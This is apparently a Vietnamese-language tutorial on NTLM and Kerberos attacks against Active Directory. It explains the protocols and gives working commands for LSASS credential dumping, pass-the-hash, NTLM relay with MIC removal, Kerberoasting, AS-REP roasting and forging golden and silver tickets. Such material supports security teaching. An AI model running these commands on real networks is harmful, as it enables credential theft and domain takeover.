## NTLM
1. [NTLM Recon](#ntlm-recon)
2. [NTLM brute-force](#ntlm-brute-force)
3. [Pass the hash](#pass-the-hash)
4. [NTLM Relay](#ntlm-relay)
## Kerberos
1. [Kerberos brute-force](#kerberos-brute-force)
2. [Kerberoast](#kerberoast)
3. [ASREProast](#asreproast)
4. [Pass the Key/Over Pass the Hash](#pass-the-key-/-over-pass-the-hash)
5. [Pass the Ticket](#pass-the-ticket)
6. [Golden/Silver ticket](#golden-/-Silver-ticket)


# NTLM
## NTLM Recon

Nếu cờ [NTLMSSP_NEGOTIATE_TARGET_INFO](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832) được gửi trong 
NEGOTIATE message thì server sẽ trả về trường TargetInfo trong CHALLENGE message chứa 1 số thông tin liên quan đến hostname và domain name.

![](ntlm_recon_wireshark.png)

[ntlm-info](https://gitlab.com/Zer1t0/ntlm-info)

```none
┌──(root💀kali)-[/home/hanx]
└─# ntlm-info smb 192.168.184.132

Target: 192.168.184.132
NbComputer: WIN-S98829HRC7E
NbDomain: H4NX0X_NetBIOS
DnsComputer: WIN-S98829HRC7E.h4nx0x.local
DnsDomain: h4nx0x.local
DnsTree: h4nx0x.local
Version: 6.3.9600
OS: Windows 8.1 | Windows Server 2012 R2

```

##  NTLM brute-force
 Vì NTLM là 1 giao thức xác thực , nó có thể được thực hiện để kiểm tra thông tin đăng nhập hoặc  sử dụng để thực hiện 1 cuộc tấn công bruteforce bằng việc sử dụng bất kì giao thức nào được hỗ trợ. Thông thường `SMB` được sử dụng vì nó có sẵn trong các máy `Windows` , ngoài ra ta cũng có thể tấn công qua HTTP hoặc Microsoft SQL Server (MSSQL).

Bruteforce NTLM có thể được thực hiện cùng với tool như là [hydra](https://github.com/vanhauser-thc/thc-hydra), [nmap](https://nmap.org/nsedoc/scripts/smb-brute.html), [cme](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#using-usernamepassword-lists), or [Invoke-Bruteforce.ps1](https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1).

```text
$ cme smb 192.168.100.10 -u anakin -p passwords.txt 
SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False)
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:1234 STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:Vader! STATUS_LOGON_FAILURE 
SMB         192.168.100.10  445    WS01-10          [+] contoso.local\anakin:Vader1234! (Pwn3d!)
```

## Pass the hash

Một trong những kỹ thuật nổi tiếng tấn cống qua giao thức NTLM là [Pass-The-Hash](https://en.hackndo.com/pass-the-hash/) (PtH). Như ta biết thì NTLM tính toán NTLM hash và session key dựa trên NT hash của client/user. Do đó nếu kẻ tấn công biết được mã NT hash thì có thể sử dụng hàm băm này để mạo danh client trong xác thực NTLM ngay cả khi không cần biết bản rõ của mật khẩu.

Để trích xuất được password hash Kerberos chúng ta phải biết nó được lưu trữ như thế nào.

Vì việc triển khai Kerberos của Microsoft sử dụng single sign-on, do đó phải password hash phải được lưu trữ ở 1 nơi nào đó là để làm mới TGT request. Trong phiên bản hiện tại của Windows thì các hashes được lưu trữ tại Local Security Authority Subsystem Service (LSASS) memory space. 

Nếu chúng ta có quyền truy cập tới nhưng hàm băm này, chúng ta có thể crack chúng và lấy mật khẩu ở bản rõ hoặc sử dụng lại chúng cho các cuộc tấn không khác .  
Vì LSASS process là 1 phần của hệ điều hành , chúng ta cần quyền SYSTEM hoặc local administrator để truy cập lại tới các hashes này do đó ta sẽ phải leo thang đặc quyền.  
Đi sâu hơn thì cấu trúc của dữ liệu được sử dụng để lưu trữ các hash trong bộ nhớ không được hiển thị trong các document công khai và chúng cũng được mã hóa bằng  
LSASS-stored key.

Để trích xuất các NT hash ta có thể sử dụng command [mimikatz sekurlsa :: logonpasswords](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords). Ngoài ra có thể [dump the lsass process](https://en.hackndo.com/remote-lsass-dump-passwords/) với tools như  [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sqldumper](https://lolbas-project.github.io/#/dump) , sau đó đọc dữ liệu được dump với [mimikatz](https://github.com/gentilkiwi/mimikatz), [pypykatz](https://github.com/skelsec/pypykatz) or [read the dump remotely](https://en.hackndo.com/remote-lsass-dump-passwords/) with [lsassy](https://github.com/Hackndo/lsassy).


```cmd
C:\Tools\active_directory> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

```none
psexec.py -hashes ":<hash>" <user>@<ip>
wmiexec.py -hashes ":<hash>" <user>@<ip>
atexec.py -hashes ":<hash>" <user>@<ip> "command"
evil-winrm -i <ip>/<domain> -u <user> -H < hash>
xfreerdp /u:<user> /d:<domain> /pth:<hash> / v:<ip>
```

## NTLM Relay


[NTLM Relay](https://en.hackndo.com/ntlm-relay/) bao gồm 1 người đứng ở giữa và lợi dụng vị trí trung gian của nó để chuyển hướng xác thực NTLM đến 1 máy chủ mà nó muốn để có lấy `authenticated session`.

![](ntlm_relay_basic.png)

```none
  client                 attacker               server
      |                       |                     |
      |                       |                -----|--.
      |     NEGOTIATE         |     NEGOTIATE       |  |
      | --------------------> | ------------------> |  |
      |                       |                     |  |
      |     CHALLENGE         |     CHALLENGE       |  |> NTLM Relay
      | <-------------------- | <------------------ |  |
      |                       |                     |  | 
      |     AUTHENTICATE      |     AUTHENTICATE    |  |
      | --------------------> | ------------------> |  |
      |                       |                -----|--'
      |                       |    application      |
      |                       |     messages        |
      |                       | ------------------> |
      |                       |                     |
      |                       | <------------------ |
      |                       |                     |
      |                       | ------------------> |
      |                       |                     |
```


Nhưng liệu nó có đơn giản như vậy không, ta sẽ phải đi vào chi tiết về giao thức NTLM

```text
                        client               server
                           |                    |
 AcquireCredentialsHandle  |                    |
           |               |                    |
           v               |                    |
 InitializeSecurityContext |                    |
           |               |     NEGOTIATE      |
           '-------------> | -----------------> | ----------.
                           |     - flags        |           |
                           |                    |           v
                           |                    | AcceptSecurityContext
                           |                    |           |
                           |                    |       challenge
                           |     CHALLENGE      |           |
           .-------------- | <----------------- | <---------'
           |               |   - flags          |
       challenge           |   - challenge      |
           |               |   - server info    |
           v               |                    |
 InitializeSecurityContext |                    |
       |       |           |                    |
    session  response      |                    |
      key      |           |    AUTHENTICATE    |
       '-------'---------> | -----------------> | ------.--------.
                           |   - response       |       |        |
                           |   - session key    |       |        |
                           |     (encrypted)    |   response  session
                           |   - attributes     |       |       key
                           |     + client info  |       |        |
                           |     + flags        |       v        v
                           |   - MIC            | AcceptSecurityContext
                           |                    |           |
                           |                    |           v
                           |                    |           OK
                           |                    |
```

Để tránh việc attacker ở giữa có thể lấy được session và thực hiện các tác vụ độc hại với server thì SMBv2 trở đi các gói tin sau khi xác thực  yêu cầu phải được ký ở mặc định

![](ntlm_session_signing_failed.png)

Làm sao để có lấy được chữ ký trong khi chữ ký được mã hóa bởi gói tin và `password hash` và password hash đâu được truyền trong đường truyền đâu, do đó ta không thể giả mạo được chữ ký.

Ta sẽ suy nghĩ theo chiều hướng khác là làm thế nào để loại bỏ được chữ ký ra khỏi gói tin, để làm điều này thì ta sẽ phải xem trước khi yêu cầu ký gói tin thì client và server đã trao đổi những gì

Ví dụ: nếu **DESKTOP01** muốn giao tiếp với  **DC01 ,** **DESKTOP01** trong gói tin đầu tiên chỉ ra rằng client hỗ trợ ký gói, không yêu cầu ký, nhưng có thể ký nếu cần, nếu cần.

![](ntlm_ex1.png)

**DC01** chỉ ra rằng anh ấy không chỉ hỗ trợ việc ký mà còn yêu cầu nó.

![](ntlm_ex2.png)

Trong giai đoạn thương lượng, client và server đặt cờ  `NEGOTIATE_SIGN` thành **1** vì cả hai đều hỗ trợ ký.

![](ntlm_negotiate_flags.png)

Sau khi xác thực này hoàn tất, phiên tiếp tục và các packet tiếp theo sẽ được ký bởi hash password của client và gói tin.

![](ntlm_ex3.png)

[link](https://docs.microsoft.com/fr-fr/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2)

![](1Capture.PNG)

Vậy ta chỉ cần sửa gói tin và thay các cờ này thành 0 là ta sẽ k cần phải ký vào các gói tin. Ezzzzzzz !!!

Nhưng đâu có đơn giản như vậy và những người tạo ra họ cũng biết điều đó nên họ sẽ phải  thêm 1 chữ ký nữa gọi là `MIC` để xác thực xem gói tin có bị sửa đổi hay không.

```none
MIC=HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE)
```

```none
           NEGOTIATE        CHALLENGE        AUTHENTICATE
               |                |                 |
               '----------------'-----------------'
                                |
                                v
                                
 Exported Session Key ---->  HMAC-MD5

                                |
                                v
                               MIC
```

Điều quan trọng là session key được tính toán dựa trên password hash của client do đó kẻ tấn công sẽ không thể làm giả được mà thay vì đó họ sẽ phải tính toán để loại bỏ MIC ra khỏi gói tin , bao gồm cả việc thay đổi cờ mic thành 0.

![](ntlm_mic_av.png)

Nhưng điều này chỉ hữu ích với NTLMv1 vì NTLMv2 sẽ bảo vệ mic tốt hơn vì nó sẽ yêu cầu client cung cấp nhiều thông tin hơn để tránh việc bị làm giả.

![](ntlm_mic_protection.png)


```none
nmap --script=smb2-security-mode -p445 192.168.184.132  
python3 ntlmrelayx.py -t 192.168.184.134 --remove-mic
```


# Kerberos

## Kerberos brute-force

Ta có thể sử dụng  [Rubeus brute](https://github.com/GhostPack/Rubeus#brute), [kerbrute (Go)](https://github.com/ropnop/kerbrute), [kerbrute (Python)](https://github.com/TarlogicSecurity/kerbrute) hoặc [cerbero](https://github.com/Zer1t0/cerbero#brute)

```text
$ python kerbrute.py -domain contoso.local -users users.txt -passwords passwords.txt -dc-ip 192.168.100.2
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Valid user => Anakin
[*] Blocked/Disabled user => Leia
[*] Valid user => Han [NOT PREAUTH]
[*] Valid user => Administrator
[*] Stupendous => Anakin:Vader1234!
[*] Saved TGT in Anakin.ccache
```

## Kerberoast

Trong Active Directory, một ST có thể được yêu cầu bởi bất kỳ người dùng nào đối với bất kỳ dịch vụ nào mà nó được đăng ký trong domain database thông qua SPN , bất kể dịch vụ đó có đang chạy hay không.
Hơn nữa, ST sẽ được mã hóa một phần bằng khóa Kerberos (bắt nguồn từ mật khẩu) của service user. Do đó, nếu bạn nhận được ST, bạn có thể thử bẻ khóa mật khẩu người dùng dịch vụ bằng cách cố gắng giải mã ST.
Hầu hết các dịch vụ được đăng ký trong tài khoản máy, có mật khẩu được tạo tự động gồm [120 ký tự, thay đổi hàng tháng](https://adsecurity.org/?p=280) , vì vậy việc bẻ khóa ST của chúng là không khả thi.
Tuy nhiên, đôi khi các dịch vụ được gán cho các tài khoản người dùng thông thường, do mọi người quản lý, có thể có mật khẩu yếu. Các ST của các dịch vụ đó sẽ cho phép bẻ khóa chúng để lấy mật khẩu của người dùng.
Cuộc [tấn công Kerberoast](https://en.hackndo.com/kerberoasting/) bao gồm các yêu cầu ST cho các dịch vụ đó của các tài khoản người dùng thông thường và cố gắng bẻ khóa chúng để lấy mật khẩu của người dùng. Thông thường, người dùng đăng kí dịch vụ cũng có đặc quyền, vì vậy đây là những tài khoản ngon.
Bạn có thể kiểm tra tài khoản người dùng có SPN với bất kỳ ứng dụng LDAP nào bằng cách sử dụng:
```none
(&(samAccountType=805306368)(servicePrincipalName=*))
```

Cụ thể hơn, để truy xuất các ST để bẻ khóa, bạn có thể sử dụng [GetUserSPNs.py impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) , lệnh [Rubeus kerberoast](https://github.com/GhostPack/Rubeus#kerberoast) hoặc tập lệnh [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) .

```text
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.242.162 -request
hashcat -m 13100 -a 0 hash.txt pass.txt
```

Khi bạn đã có ST, bạn có thể thử bẻ khóa chúng bằng [hashcat](https://hashcat.net/hashcat/)

## ASREProast
Hầu hết người dùng cần thực hiện xác thực trước Kerberos, nghĩa là gửi một timestamp được mã hóa bằng khóa Kerberos của user tới KDC trong thông báo AS-REQ (để yêu cầu TGT).

Tuy nhiên, trong một số trường hợp hiếm hoi, xác thực trước Kerberos bị vô hiệu hóa đối với tài khoản bằng cách đặt [cờ DONT_REQUIRE_PREAUTH](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) . Do đó, bất kỳ ai cũng có thể mạo danh các tài khoản đó bằng cách gửi thông báo AS-REQ và [phản hồi AS-REP](https://tools.ietf.org/html/rfc4120#section-5.4.2) sẽ được trả về từ KDC mà dữ liệu được mã hóa bằng khóa Kerberos của người dùng. Từ đó ta có thể crack để lấy password của user này.

![](Capture123.PNG)

LDAP query

```ldap
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```


```none
python3 GetNPUsers.py h4nx0x.local/new -dc-ip=192.168.184.132
hashcat -m 18200 hash.txt Pass.txt     
```

## Pass the Key/Over Pass the Hash

Như bạn có thể nhận thấy, để request TGT, người dùng không cần sử dụng mật khẩu mà là Kerberos key của nó. Do đó, nếu kẻ tấn công có thể đánh cắp Kerberos key (NT hash hoặc AES keys), nó có thể được sử dụng để yêu cầu TGT thay mặt người dùng mà không cần biết mật khẩu của người dùng.

Thông thường trong Windows, các khóa Kerberos được lưu vào bộ nhớ đệm trong lsass process và chúng có thể được truy xuất bằng cách sử dụng lệnh [mimikatz sekurlsa :: ekeys](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#ekeys). Ngoài ra, bạn có thể dump the lsass process bằng các công cụ như [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) , [sqldumper hoặc các công cụ khác](https://lolbas-project.github.io/#/dump) và trích xuất khóa với mimikatz.

Trong Linux thì Kerberos keys được lưu trữ ở [keytab](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html) files để sử dụng cho Kerberos service. Keytab file thường được lưu trữ ở /etc/krb5.keytab  hoặc được chỉ định trong biến môi trường  `KRB5_KTNAME` hoặc `KRB5_CLIENT_KTNAME` , và cũng có thể được chỉ định trong file cấu hình /etc/krb5.conf.

## Pass the Ticket

Kỹ thuật Pass the Ticket bao gồm đánh cắp một vé và session key, sử dụng chúng để mạo danh người dùng nhằm truy cập vào các tài nguyên hoặc dịch vụ. Cả TGT và ST đều có thể được sử dụng, nhưng TGT được ưu tiên hơn vì chúng cho phép truy cập vào bất kỳ dịch vụ nào (bằng cách sử dụng nó để yêu cầu ST) thay mặt cho người dùng, trong khi các ST chỉ giới hạn ở một dịch vụ (hoặc nhiều hơn nếu [SPN được sửa đổi](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/) thành một dịch vụ khác của cùng một người dùng).

Trong Windows, các vé có thể được tìm thấy trong lsass process memory và có thể được trích xuất bằng [mimikatz sekurlsa::tickets](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets) hoặc  [Rubeus](https://github.com/GhostPack/Rubeus#dump) . Cách khác là trích xuất lsass process bằng các công cụ như [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) , [sqldumper hoặc các công cụ khác](https://lolbas-project.github.io/#/dump) và trích xuất các vé bằng mimikatz hoặc [pypykatz](https://github.com/skelsec/pypykatz).

```none
PS C:\> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp

pypykatz lsa minidump lsass.dmp -k /tmp/kerb > output.txt
```

Mặc khác trong Linux thì các vé được lưu trữ theo một cách khác nhau. Được lưu ở định dạng [ccache](https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html) và thường được tìm thấy trong tệp có định dạng `krb5cc_%{uid}` trong đó uid là iud của user, để lấy vé thì ta phải có quyền. 
Để chắc chắn [nơi lưu trữ các vé](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) trong máy Linux, bạn có thể kiểm tra [tệp cấu hình Kerberos](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html) trong `/etc/krb5.conf`.

## Golden/Silver ticket

### Silver ticket

PAC  được tìm thấy trong mọi vé (TGT hoặc TGS) và được mã hóa bằng khóa KDC hoặc bằng khóa của tài khoản dịch vụ được yêu cầu. Do đó, người dùng không có quyền kiểm soát thông tin này, vì vậy anh ta không thể sửa đổi các quyền, nhóm của chính mình, v.v
Cấu trúc này rất quan trọng vì nó cho phép người dùng truy cập (hoặc không truy cập) một dịch vụ, một tài nguyên, để thực hiện các hành động nhất định.

![](pac.png)

TGS được mã hóa bằng NT hash của tài khoản đang chạy dịch vụ (tài khoản máy hoặc tài khoản người dùng). Do đó, nếu kẻ tấn công quản lý để trích xuất mật khẩu hoặc mã băm NT của tài khoản dịch vụ, thì hắn có thể giả mạo phiếu dịch vụ (TGS) bằng cách chọn thông tin mà hắn muốn đưa vào để truy cập dịch vụ đó mà không cần hỏi KDC. 

![](tgs.png)

 Sau đó anh ta chỉ cần gửi vé này đến dịch vụ được nhắm đến cùng với một số thông  xác thực mà anh ta mã hóa bằng session key giúp anh ta tùy ý chọn trong TGS. Dịch vụ sẽ có thể giải mã TGS, trích xuất khóa phiên, giải mã thông tin xác thực và cung cấp dịch vụ cho user vì thông tin giả mạo trong PAC chỉ ra rằng người dùng là Quản trị viên miền và dịch vụ này cho phép Quản trị viên miền sử dụng nó.

![](silverticket.png)

```none

kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:0123456789abcdef0123456789abcdef /target:DESKTOP-01.adsec.local /service:cifs /ptt

ticketer.py -nthash 0123456789abcdef0123456789abcdef -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local -spn CIFS/DESKTOP-01.adsec.local random_user

export KRB5CCNAME='/path/to/random_user.ccache'

psexec.py -k DESKTOP-01.adsec.local

```


###  Golden Ticket

Chúng ta thấy rằng với **Vé bạc** , có thể truy cập vào dịch vụ do tài khoản miền cung cấp nếu tài khoản đó bị tấn công nhưng chúng ta có thể tiến xa hơn nữa.

Để có thể sửa đổi TGT hoặc tạo ra một TGT mới, người ta cần biết khóa đã mã hóa nó, tức là khóa KDC. Khóa này thực chất là mã băm của `krbtgt`tài khoản. Tài khoản này là một tài khoản không có quyền cụ thể (ở cấp hệ thống hoặc Active Directory) và thậm chí còn bị vô hiệu hóa. Khó được tìm thấy  bằng các tác vụ đơn giản giúp nó được bảo vệ tốt hơn.

Nếu kẻ tấn công từng tìm ra mã băm bí mật của tài khoản này, thì hắn sẽ có thể giả mạo TGT với một PAC tùy ý. Chỉ cần giả mạo một TGT nói rằng người dùng là thành viên của nhóm "Domain Admins", và thế là xong.

Chính TGT này có tên là **Golden Ticket**

![](goldenticket.png)


```none
/kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /krbtgt:0123456789abcdef0123456789abcdef /ptt

ticketer.py -nthash 0123456789abcdef0123456789abcdef -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local random_user

export KRB5CCNAME='/chemin/vers/random_user.ccache'

secretsdump.py -k DC-01.adsec.local -just-dc-ntlm -just-dc-user krbtgt

```
